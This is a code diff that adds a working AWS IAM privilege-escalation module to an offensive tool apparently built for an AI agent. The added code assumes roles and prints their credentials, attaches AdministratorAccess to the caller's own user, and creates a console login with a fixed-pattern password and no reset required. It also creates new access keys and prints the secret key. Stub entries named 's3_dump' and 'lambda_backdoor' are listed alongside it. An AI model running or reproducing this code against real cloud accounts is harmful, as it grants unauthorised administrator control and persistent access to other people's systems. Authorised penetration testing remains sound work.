@@ -152,6 +152,68 @@ async function iamEnum(args: string[], timeout: number): Promise<HookResult> {
   return { output: output.join("\n"), findings }
 }
 
+async function iamPrivesc(args: string[], timeout: number): Promise<HookResult> {
+  const method = argVal(args, "--method")
+  if (!method) return { output: "ERROR: --method required (passrole|assumerole|attach_policy|create_login|create_key)", findings: [] }
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const roleArn = argVal(args, "--role-arn")
+
+  if (method === "passrole") {
+    if (!roleArn) return { output: "ERROR: --role-arn required for passrole", findings: [] }
+    const r = await aws(["iam", "list-roles", "--query", `Roles[?Arn=='${roleArn}']`], profile, region, timeout)
+    if (r.exitCode !== 0) return { output: `[-] Cannot query role: ${r.stderr.trim()}`, findings: [] }
+    const roles = tryJson(r.stdout) || []
+    if (roles.length === 0) return { output: `[-] Role not found: ${roleArn}`, findings: [] }
+    const trust = roles[0].AssumeRolePolicyDocument
+    return { output: `[+] Role: ${roleArn}\n[+] Trust policy:\n${JSON.stringify(trust, null, 2)}\n[*] Check if current identity can iam:PassRole + lambda:CreateFunction`, findings: [] }
+  }
+
+  if (method === "assumerole") {
+    if (!roleArn) return { output: "ERROR: --role-arn required for assumerole", findings: [] }
+    const r = await aws(["sts", "assume-role", "--role-arn", roleArn, "--role-session-name", "cyberstrike"], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const creds = tryJson(r.stdout)?.Credentials
+      return { output: `[+] AssumeRole successful: ${roleArn}\n    AccessKeyId: ${creds?.AccessKeyId}\n    Expiration: ${creds?.Expiration}`, findings: [] }
+    }
+    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (method === "attach_policy") {
+    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+    const arn = tryJson(id.stdout)?.Arn || ""
+    const username = arn.split("/").pop()
+    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
+    const r = await aws(["iam", "attach-user-policy", "--user-name", username, "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"], profile, region, timeout)
+    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
+    return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (method === "create_login") {
+    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
+    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
+    const pw = `CyStr!ke${Date.now().toString(36)}`
+    const r = await aws(["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"], profile, region, timeout)
+    if (r.exitCode === 0) return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
+    return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  if (method === "create_key") {
+    const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+    const username = (tryJson(id.stdout)?.Arn || "").split("/").pop()
+    if (!username) return { output: "[-] Cannot determine current username", findings: [] }
+    const r = await aws(["iam", "create-access-key", "--user-name", username], profile, region, timeout)
+    if (r.exitCode === 0) {
+      const key = tryJson(r.stdout)?.AccessKey
+      return { output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`, findings: [] }
+    }
+    return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
+  }
+
+  return { output: `ERROR: Unknown method: ${method}`, findings: [] }
+}
+
 async function stub(name: string): Promise<HookResult> {
   return { output: `[*] ${name}: not yet implemented in native TS`, findings: [] }
 }
@@ -186,7 +248,7 @@ export const AwshookTool = Tool.define("awshook", {
 
     const dispatch: Record<Program, () => Promise<HookResult>> = {
       iam_enum: () => iamEnum(params.args, params.timeout_seconds),
-      iam_privesc: () => stub("iam_privesc"),
+      iam_privesc: () => iamPrivesc(params.args, params.timeout_seconds),
       s3_dump: () => stub("s3_dump"),
       lambda_backdoor: () => stub("lambda_backdoor"),
       ssm_exec: () => stub("ssm_exec"),
